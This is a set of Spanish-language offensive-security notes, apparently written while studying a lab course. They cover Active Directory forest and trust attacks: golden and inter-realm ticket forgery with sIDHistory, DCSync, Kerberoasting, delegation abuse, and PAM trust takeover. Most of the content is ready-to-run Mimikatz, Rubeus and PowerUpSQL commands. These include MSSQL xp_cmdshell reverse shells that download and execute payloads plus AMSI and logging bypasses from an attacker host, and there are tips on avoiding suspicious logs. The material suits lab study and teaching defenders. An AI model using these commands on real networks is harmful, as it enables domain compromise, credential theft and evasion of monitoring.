- Usar el ST para acceder al servicio objetivo (puede que tenga que utilizarlo dos veces)

```
### Usar el ST para acceder al servicio objetivo
### 1era Forma
misc::convert lsa TGS_Administrator@us.techcorp.local_krbtgt~TECHCORP.LOCAL@US.TECHCORP.LOCAL.kirbi
### 2da Forma
.\kirbikator.exe lsa .\CIFS.techcorp-dc.techcorp.local.kirbi

### Hacer uso del servicio
ls \\techcorp-dc.techcorp.local\c$
```

- También se puede realizar la solicitud del TGS y el PTT a la vez mediante Rubeus 

```
### Solicitud del ST y PTT para el servicio CIFS
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt

### Hacer uso del servicio
ls \\techcorp-dc.techcorp.local\c$
```
### sIDHistory - krbtgt

- Si tenemos privilegios de administrador de dominio en el dominio secundario y somos capaces de extraer el krbtgt hash de la cuenta del dominio secundario, que puede usar el mismo hash para solicitar un TGT para el administrador empresarial y obtener un ticket que se puede usar para escalar u obtener acceso al dominio empresarial.
- La opción ``/sids`` de mimIkatz está configurando forzosamente el sIDHistory para el grupo Enterprise Admin para ``us.techcorp.local`` que es el grupo de administración de empresas forestales.
- Enterprise Admins (RID 519)

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN_CHILD> /sid:<SID_DOMAIN_CHILD> /krbtgt:<HASH_KRBTGT> /sids:<SID_DOMAIN_PARENT>-<RID> /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'
```

- Ahora podemos acceder a techcorp-dc como Administrator

```
ls \\techcorp-dc.techcorp.local\c$

Enter-PSSession techcorp-dc.techcorp.local
```

- Evite registros sospechosos utilizando el grupo Domain Controllers

```
Invoke-Mimikatz -Command '"kerberos::golden /user:us-dc$ /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:516 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /ptt"'
```


```
S-1-5-21-2578538781-2508153159-3419410681-516 - Controladores de dominio
S-1-5-9 - Controladores de Dominio de Empresa

Invoke-Mimikatz -Comando '"lsadump::dcsync /user:techcorp\Administrator /domain:techcorp.local"'
```
# Cross Forest Attacks 

## Kerberoast

Es posible ejecutar Kerberoast a través de la confianza del bosque

```
# Enumeración de cuentas Kerberoasteables
### PowerView
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}

### ActiveDirectory Module
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties 
ServicePrincipalName -Server $_.Name}
```

```
# Rubeus
## Solicitar el TGS para el usuario kerberoasteable "storagesvc" del dominio eu.local
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt

## Cracking sobre el hash
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

# PowerShell
## Obtener TGS en memoria mediante PowerShell
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<ServicePrincipalName>"

Ejemplo: New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```

Una vez se obtiene la contraseña, se puede usar para obtener un TGT del usuario comprometido y moverse lateralmente. 

```
## PassTheTicket
.\Rubeus.exe asktgt /user:storagesvc /password:"Qwerty@123" /domain:eu.local /ptt

## winrs
winrs -r:eu-file.eu.local cmd.exe
```
## Constrained Delegation - Protocol Transition

La delegación restringida clásica no funciona en todos las confianzas forestales, pero se puede abusar de ella una vez se tiene un punto de apoyo a través de la confianza forestal.

```
# Enumeración de Constrained Delegation sobre el bosque eu.local
### PowerView
Get-DomainUser –TrustedToAuth -Domain eu.local
Get-DomainComputer –TrustedToAuth -Domain eu.local

### Modulo ActiveDirectory
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local | Select msDS-AllowedToDelegateTo -ExpandProperty msDS-AllowedToDelegateTo
```

``msDS-AllowedToDelegateTo`` mostrará los SPNs configurados, esto permite identificar sobre que cuenta y en dónde se ha configurado Constrained Delegation. 

```
### Solicitar Hash de storagesvc
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@2019 /user:storagesvc /domain:eu.local

### S4U
### Impersonar al usuario Administrator para hacer uso del servicio ldap
C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
```

Ejecutar ``klist`` debería entregar algo como esto:

```
### klist
#0> Client: Administrator @ EU.LOCAL
    Server: ldap/eu-dc.eu.local @ EU.LOCAL
```

Impersonar al usuario Administrator y tener acceso al servicio ldap permite realizar un DCSync Attack.

- Recordar que se debe realizar el ataque DCSync en la misma consola en donde se realiza el PassTheTicket.

```
# Abusar de TGS a LDAP
### Forma 1
### Realizar ataque DCSync sobre el usuario krbtgt
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\krbtgt /domain:eu.local"'

### Forma 2
### Realizar ataque DCSync sobre el usuario krbtgt
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local

### Forma 3
### Realizar ataque DCSync sobre el usuario administrator
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator --Domain eu.local --DomainController eu-dc.eu.local
```

- Cuando se realiza un DCSync Attack, se generará un evento de registro de ID 4662 en el servidor afectado.
## Unconstrained Delegation

Unconstrained Delegation ambién funciona a través de un bosque de dos vías de confianza con TGT Delegación activada. Delegación TGT está desactivada por defecto y debe activarse explícitamente a través de un fideicomiso para el bosque de confianza (destino).  

- En el laboratorio, TGTDelegation se establece de usvendor.local a techcorp.local (pero no para la otra dirección).  

Para enumerar si TGTDelegation está habilitado en un bosque de confianza, ejecute el siguiente comando desde un DC:

```
netdom trust trustingforest /domain:trustedforest /EnableTgtDelegation
```

Ejemplo, se ejecutará en usvendor-dc

```
netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation

### PowerShell ADModule
Get-ADTrust -servidor usvendor.local -Filtro *
```

Unconstrained Delegation a través de confianzas forestales sigue el mismo camino que Unconstrained Delegation dentro de un mismo bosque:

1. Impersonar al usuario con privilegios sobre el host con Unconstrained Delegation

```
C:\Windows\system32> C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

2. Llevar Rubeus a host con Unconstrained Delegation

```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe /Y
```

3. Acceder y monitorizar tickets en el host con Unconstrained Delegation

```
C:\Windows\system32>winrs -r:us-web cmd.exe

C:\Users\webmaster>C:\Users\Public\Rubeus.exe monitor /targetuser:usvendor-dc$ /interval:5 /nowrap
```

4. Ejecutar ataque de Coercion (Ejemplo: Printer Bug)

```
C:\AD\Tools>C:\AD\Tools\MS-RPRN.exe \\usvendor-dc.usvendor.local \\us-web.us.techcorp.local
```

5. Obtener Ticket y realizar PassTheTicket

```
C:\AD\Tools> C:\AD\Tools\Rubeus.exe ptt /ticket:TGTofUSVendor-DC$
C:\AD\Tools> C:\AD\Tools\SharpKatz.exe --Command dcsync --User usvendor\krbtgt --Domain usvendor.local --DomainController usvendor-dc.usvendor.local
```
## Trust Key

- Abusando del flujo de confianza entre bosques en una confianza bidireccional, es posible acceder a recursos a través del límite del bosque.
- Podemos utilizar la clave de confianza, de la misma manera que en las confianzas de dominio, pero podemos acceder ``sólo a aquellos recursos que están explícitamente compartidos`` con nuestro bosque actual.
- ``El filtrado SID se produce entre bosques`` de modo que un bosque no puede solicitar ningún recurso como EA o DA para otro bosque.
- Para acceder a los recursos del dominio de confianza, el filtrado SID debe estar desactivado.

En este ejemplo, primero se impersonará al usuario Administrator de eu.local para solicitar las claves de confianza ``eu\euvendor`` ( ``eu`` -> ``euvendor`` ).

```
C:\Windows\system32>C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /ptt"
mimikatz# lsadump::dcsync /user:eu\euvendor$ /domain:eu.local
```

Otra forma es solicitar las claves de confianza desde el mismo DC del dominio eu:

```
### Solicitar clave de confianza entre bosques
### Forma 1
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
### Forma 2
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\euvendor$"'
### Forma 3
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

Ahora se forjará un TGT entre eu.local y euvendor.local, y con un RID igual a 519 (Enterprise Admins) desde ``eu-dc.eu.local``:

```
### Generar un TGT entre bosques para el usuario Administrator 
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'

Invoke-Mimikatz -Command '"kerberos::golden /user:<user> /domain:<dominio_pwned> /sid:<sid_dominio_pwned> /rc4:<rc4_hash_eu/euvendor$> /service:krbtgt /target:<dominio_objetivo> /sids:<sid_dominio_objetivo>-<RID_objetivo> /ticket:<output_ticket.kirbi>"'
```

```
### Solicitar TGS
### Obtener TGS para un servicio (CIFS) mediante el ticket de confianza falsificado
.\asktgs.exe C:\AD\Tools\kekeo_old\sharedwitheu.kirbi CIFS/euvendor-
dc.euvendor.local

## Uso del TGS para acceder al recurso destino
.\kirbikator.exe lsa CIFS.euvendor-dc.euvendor.local.kirbi
ls \\euvendor-dc.euvendor.local\eushare\
```

También se pueden crear tickets para otros servicios (como HOST y RPCSS para WMI, HOST y HTTP para PowerShell Remoting y WinRM).

Rubeus también puede ser usado para pasar el ticket de confianza falsificado y solicitar el TGS mediante un solo comando:

```
### Rubeus
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

C:\Users\Public\Rubeus.exe asktgs /ticket:<output_ticket.kirbi> /service:HTTP/some_machine.other_forest.local /dc:some-dc.other_forest.local /ptt
```

Hasta este momento se tiene un TGS para el servicio ``CIFS`` sobre ``euvendor-dc.euvendor.local`` como Enterprise Admin. Deberíamos poder acceder a todos sus recursos pero... **¿Por qué no podemos acceder a todos los recursos igual que dentro del bosque?**

La respuesta es el filtrado de SID que filtra los SID de alto privilegio del SIDHistory de un TGT que cruza el límite del bosque. Esto significa que no podemos acceder a todos los recursos del bosque de confianza como Enterprise Admins.

**¿Cómo evitar SIDFiltering?**

Para evitar SIDFiltering considerar ``S-1-5-21-<Dominio>-R`` cuando ``RID >= 1000``, es decir, identificadores para identidades de dominio y grupos de dominio creados por usuarios.
Si tenemos una confianza externa (o ``/enablesidhistory:yes``) puede intentar acceder a los recursos accesibles para el RID especificado siempre que RID > 1000

 ``/enablesidhistory:yes`` Indica un bosque con el historial de SID habilitado

En el ejemplo se tiene acceso DA a ``eu.local``. Para enumerar las confianzas:

````
Get-ADTrust -Filtro *
````

Si ``SIDFilteringForestAware`` está en ``True``, significa que SIDHistory está habilitado en todo el bosque de confianza.

```
# Obtener grupos en otro bosque con RID > 1000
Get-ADGroup -Filter 'SID -ge "S-1-5-21-<ID>-1000"' -Server <dominio_objetivo>
Ejemplo: Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
Get-ADGroup -Identity <NOMBRE_GRUPO> -Server <dominio_objetivo>
Ejemplo: Get-ADGroup -Identity EUAdmins -Server euvendor.local

# Generar inter-realm TGT using group
./BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<dominio_pwned> /sid:<sid_dominio_pwned> /rc4:<TRUST_TICKET_HASH> /service:krbtgt /target:<dominio_objetivo> /sids:<sid_dominio_objetivo>-<RID_objetivo> /ticket:<output_ticket.kirbi>" "exit"

# Obtener TGS para algun servicio
./Rubeus.exe asktgs /ticket:<output_ticket.kirbi> /service:HTTP/some_machine.other_forest.local /dc:some-dc.other_forest.local /ptt

# Acceso a la máquina euvendor-net mediante PSRemoting
Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential

# Acceso a la máquina euvendor-net mediante winrs
winrs -r:euvendor-net.euvendor.local cmd
```

Para los ataques entre bosques, usar de preferencia el ``TRUST_TICKET_HASH`` en formato RC4 antes que AES. 
## MSSQL Server

Los servidores MSSQL suelen desplegarse en abundancia en un dominio Windows. Los servidores SQL ofrecen muy buenas opciones para el movimiento lateral, ya que permiten asignar usuarios de dominio a roles de base de datos y, de este modo, formar parte de las confianzas de AD.

Primero vamos a enumerar los enlaces a las bases de datos en todos los servidores sql, para ello solo necesitamos acceso público. Veamos si con el usuario actual se tiene acceso a alguna base de datos del dominio. Para ello se puede usar PowerUpSQL.

Los siguientes comandos entregará el nombre de la instancia, hostname en donde se encuentra la db, el actual inicio de sesión y demás información relevante:

```
### Enumerar instancias en el dominio actual
Get-SQLInstanceDomain
### Obtener información del servidor en donde se encuentran las instancias
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLServerInfo -Verbose
```

- Si ``IsSysadmin : No`` , indica que no se tiene acceso a sysadmin.

También se puede verificar la accesibilidad a las instancias con el usuario actual

```
### Verificar accesibilidad
Get-SQLConnectionTestThreaded
Get-SQLConnectionTestThreaded -Instance us-mssql.us.techcorp.local

### Verificar accesibilidad en las instancias activas del dominio actual
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
#### Database Links

```
### Buscar enlaces a servidores remotos (no recursivamente)
### PowerUpSQL
### Database Links
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose

### HeidiSQL
### Enumeración manual de enlaces a servidores remotos
select * from master..sysservers
```

- Ver la salida de ``SRVNAME`` y ``DATASOURCE`` para ver si se obtiene algún enlace a la base de datos diferente de ``us-mssql``. Ejemplo: ``SRVRNAME: 192.168.23.25`` y ``DATASOURCE: 192.168.23.25`` 

Ahora en 192.168.23.25 se buscan enlaces a bases de datos (Database Links)

```
# HeidiSQL
### La función Openquery puede utilizarse para ejecutar consultas en una base de datos vinculada
select * from openquery("192.168.23.25",'select * from master..sysservers')
```

La consulta anterior puede permitir identificar nuevos enlaces a dbs desde 192.168.23.25 como por ejemplo ``DB-SQLSRV``.

Ahora se realiza una consulta anidada a ``db-sqlsrv`` que está enlazada a ``192.168.23.25`` (aka ``db-sqlprod``)que a su vez está enlazada a ``us-mssql``.

```
### Las consultas Openquery pueden encadenarse para acceder a enlaces dentro de enlaces (enlaces anidados)
### Se realiza la consulta para obtener la version de la DB db-sqlsrv
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')
```

Tambien se puede enumerar los enlaces de bases de datos de forma recursiva mediante PowerUpSQL:

```
### Enumerar Database Link de forma recursiva
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local
```

El comando anterior mostrará si se tienen permisos sysadmin, los servidores en donde se encuentran las DBs, etc.

Hasta el momento se tiene:
- Una cuenta de nosotros en US-MSSQL con privilegios del usuario actual el cual no es administrador en el sistema de base de datos actual.
- En DB-SQLPROD, dbuser se ha usado para el enlace entre las bases de datos 192.168.23.25 y US-MSSQL, y este usuario tiene privilegios de administrador.
- DB-SQLSRV está usando sa, usuario administrador del sistema el cual es usado de forma predeterminada por lo que tiene privilegios de administrador.
#### Command Execution

Si xp_cmdshell está habilitado (o rpcout es true que nos permite habilitar xp_cmdshell), es posible ejecutar comandos en cualquier nodo en los enlaces de base de datos usando los siguientes comandos.

Si ``rpcout`` está activado(desactivado por defecto), xp_cmdshell puede activarse mediante:

```
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "db-sqlsrv"
```

Por ejemplo, el enlace de DB-SQLProd a DB-SQLSrv está configurado para usar ``sa``. Es decir, podemos habilitar ``RPC Out`` y ``xp_cmdshell`` en DB-SQLSrv(Ignore los mensajes de advertencia):

```
### Invoke-SQLCmd
### Habilitar RPC OUT
PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"

PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"

### Habilitar xp_cmdshell
PS C:\Windows\system32> Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""

PS C:\Windows\system32> Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
```

Desde el servidor SQL inicial, los comandos del SO pueden ejecutarse utilizando consultas de enlace anidadas:
##### HeidiSQL

```
### Consulta "whoami" en DB-SQLSRV
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell " whoami "'')')
```

```
### Revershell sobre DB-SQLSRV
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.76/Invoke-PowerShellTcp.ps1'''')"'')')
```

```
### Revershell sobre DB-SQLSRV, amsybypass y sbloggingbypass
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell ''''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.76/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.76/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.76/Invoke-PowerShellTcp.ps1)"'''''')')
```
##### PowerUpSQL

También se pueden ejecutar comandos en las bases de datos enlazadas mediante PowerUpSQL:

```
# PowerUpSQL
### Ejecución de comandos
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami''' -QueryTarget db-sqlsrv
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami''' 
```

- Si omitimos ``-QueryTarget``, el comando intentará usar xp_cmdshell en cada enlace (link).

```
### Revershell sobre DB-SQLPROD
PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.76/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.76/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.76/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlprod
```

```
### Revershell sobre db-sqlsrv
PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.76/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.76/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.76/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```
## Foreign Security Principals (FSP)

- Un Foreign Security Principal (FSP) representa un Security Principal en un bosque externo de confianza o identidades especiales (como Usuarios Autenticados, Enterprise DCs, etc.).
- Un security principal debe tener el atributo objectSID, por lo que puede ser el administrador en una entrada de control de acceso (ACE). 
- Los principales de seguridad externos (FSP) tienen el atributo objectSID y son principales de seguridad.
- Sólo el SID de un FSP se almacena en el contenedor de entidad de seguridad externa que puede resolverse utilizando la relación de confianza.
- El FSP permite añadir entidades de seguridad externas a los **grupos de seguridad locales** del dominio. De este modo, se permite a dichos principales acceder a los recursos del bosque.

```
Referencia: https://learn.microsoft.com/en-us/archive/technet-wiki/51367.active-directory-foreign-security-principals-and-special-identities
```

- Nota: Me costó un poco entender FSP así que yo lo entiendo como, cuenta perteneciente a un dominio externo que pertenece a un grupo de seguridad dentro del dominio actual.
#### Enumeración

``Find-ForeignUser``: enumera los usuarios que están en grupos fuera de su dominio principal ``Find-ForeignGroup``: enumera todos los miembros de los grupos de un dominio y busca usuarios que están fuera del dominio consultado. Por ejemplo, si estamos en el dominio ``db.local``, buscará un usuario (``db76svc``) perteneciente a un dominio diferente como ``dbvendor.local`` .

Vamos a enumerar los FSPs para el dominio actual:

```
### PowerView
Find-ForeignGroup -Verbose
Find-ForeignUser -Verbose

### Módulo ActiveDirectory
Get-ADObject -Filtro {objectClass -eq "foreignSecurityPrincipal"}
```

Luego de obtener un usuario o grupo, podemos obtener mayor información con los siguientes comandos:

```
### Enumerar el grupo
Get-ADGroup -Filter * -Properties Member -Server other_forest.local | ?{$_.Member -match '<SID>'}

### Enumerar el usuario
Get-DomainUser -Domain other_forest.local | ?{$_.ObjectSid -eq '<SID>'}
````
### ACLs

- El acceso a los recursos de un fideicomiso forestal también se puede proporcionar sin utilizar FSPs mediante ACLs.
- Los principales añadidos a las ACLs NO aparecen en el contenedor ForeignSecurityPrinicpals ya que el contenedor sólo se rellena cuando se añade una entidad de seguridad a un grupo de seguridad local de dominio.

````
### Enumerar las ACLs para dbvendor.local desde db.local(dominio actual)
Find-InterestingDomainAcl -Domain dbvendor.local
````

El comando anterior listará los permisos/derechos que tiene un objeto sobre otro objeto perteneciente al dominio ``dbvendor.local``. 
## PAM Trust

- La confianza PAM se habilita normalmente entre un bosque Bastion o Red y un bosque de producción/usuario.
- La confianza PAM proporciona la capacidad de acceder al bosque de producción con altos privilegios sin utilizar credenciales del bosque bastión. Así, se mejora la seguridad para el bosque bastión, lo cual es muy deseado. 
- Para lograr lo anterior, se crean Shadow Principals en el dominio bastión que se asignan a grupos DA o EA SID en el bosque de producción.

Lo siguiente solo es parte del laboratorio para llegar al bosque Bastion:

```
### Enumerar FSP en el dominio bastion.local 
Get-ADTrust -Filter *
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

Puesto que se ha comprometido ``techcorp.local``, se buscará algún usuario externo a ``bastion.local`` que pertenezca a algún grupo de seguridad dentro de ``bastion.local``. Por ejemplo, se puede identificar al DA de techcorp.local formar parte de un grupo de seguridad en bastion.local. Para saber a qué grupo pertenece, ejecuta el siguiente comando: 

```
PS C:\AD\Tools> Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
```

El administrador de techcorp.local es miembro del grupo de administradores integrado en bastion.local. Ahora se enumeran confianzas y accesos sobre el bosque Bastion.

En este punto solo queda hacer un PassTheTicket sobre ``techcorp\Administrator`` y luego obtener el hash de ``bastion\Administrator``:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /domain:techcorp.local /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /dc:techcorp-dc.techcorp.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

winrs -r:bastion-dc.bastion.local cmd

C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:bastion\Administrator /domain:bastion.local" "exit"

C:\AD\Tools\Rubeus.exe asktgt /domain:bastion.local /user:administrator /aes256:a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292 /dc:bastion-dc.bastion.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
#### Enumeración de confianza PAM

```
### En bastion-dc 
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}

$bastiondc = New-PSSession bastion-dc.bastion.local 
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $bastiondc
```

- Revisar los siguientes campos de ``DistinguishedName``, ``ForestTransitive``, ``SIDFilteringForestAware``. Ejemplo:

```
DistinguishedName : CN=production.local,CN=System,DC=bastion,DC=local
ForestTransitive : True
SIDFilteringForestAware : False
```

Una vez que se sabe que hay una confianza ForestTransitive y SIDFIlteringForestAware es falso, enumerar las confianzas en production.local para estar seguro de la confianza PAM en uso.

```
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
```

- Revisar los siguientes campos de ``DistinguishedName``, ``ForestTransitive``, ``SIDFilteringForestAware``. Ejemplo:

```
DistinguishedName : CN=bastion.local,CN=System,DC=production,DC=local
ForestTransitive : True
SIDFilteringForestAware : True
TrustAttributes : 1096
```

Así que ahora sabemos que SID History está permitido para el acceso desde bastion.local a production.local.
#### Verificar usuarios miembros de Shadow Principals

```
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session
$bastiondc
```

- Revisar los siguientes campos de ``Name``, ``member``. Ejemplo:

```
Name : Shadow Principal Configuration
member : {}
msDS-ShadowPrincipalSid :

Name : prodforest-ShadowEnterpriseAdmin
member : {CN=Administrator,CN=Users,DC=bastion,DC=local}
msDS-ShadowPrincipalSid : S-1-5-21-1765907967-2493560013-34545785-519
```

Por lo tanto, el administrador de bastion.local es miembro del grupo Shadow Security Principals que está asignado al grupo Enterprise Admins de production.local. Es decir, el administrador de bastión.local tiene privilegios de administrador de empresa en producción.local.

Primero se ejecuta el siguiente comando en bastión-dc para obtener la IP de producción.local DC:

```
PS C:\Users\Administrator> Get-DnsServerZone -ZoneName production.local |fl * Get-DnsServerZone -ZoneName production.local |fl *
```

Además para utilizar PowerShell Remoting para conectarse a una dirección IP, se debe modificar la propiedad ``WSMan Trustedhosts`` en ``bastion.local``. Ejecute el siguiente comando en un PowerShell elevado en el host del inicial:

```
PS C:\Windows\system32> Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
```

Además, para conectarnos a una dirección IP tenemos que usar autenticación NTLM. Por lo tanto, se necesita ejecutar OverPass-The-Hash con hash NTLM y no con claves AES de ``bastion/Administrator`` :

```
C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth
/user:administrator /domain:bastion.local /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"
```

Ahora se establece una sesión PSRemoting directa en ``bastion-dc`` hacia ``production.local`` con el usuario miembro de los ``Shadow Principals``

```
### Establecer una sesión PSRemoting directa en bastion-dc hacia production.local
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```

## Hardening PowerShell
### PowerShell Detections

**System-wide transcription**: La transcripción en PowerShell es una característica que registra todas las actividades realizadas en una sesión de PowerShell en un archivo de registro. 

**Script Block logging:** registra bloques de código a medida que se ejecutan, por lo que captura la actividad completa y el contenido completo del script. Se obtiene un evento 4104 si algún comando es detectado por Script Block Logging

- https://medium.com/@ammadb/powershell-logging-module-logging-vs-script-block-logging-7aa74bf66261

- https://medium.com/@blue_e/logging-powershell-using-script-block-logging-7cdaad974fe6


**AntiMalware Scan Interface (AMSI):** AMSI es una interfaz que permite a las aplicaciones antivirus y soluciones de seguridad escanear y analizar scripts y contenido en tiempo real mientras se ejecutan en aplicaciones como PowerShell. AMSI puede detectar y bloquear scripts maliciosos.

**Constrained Language Mode (CLM) :** CLM bloqueará la funcionalidad de powershell a un nivel donde no se pueda usar funciones de red, ejecutar powerview con múltiples errores, etc indicando que se está ejecutando en modo CLM. CLM no está habilitado de forma predeterminada.

**Integrated with AppLocker and WDAC (Device Guard):**  AppLocker restringe que tipo de binarios están permitidos en la máquina para que puedan ejecutarse. La restricción se realiza en base al nombre del archivo, hash de archivo; mientras que WDAC proporciona control de la ejecución de código mediante políticas de aplicación.
- AppLocker + WDAC = 


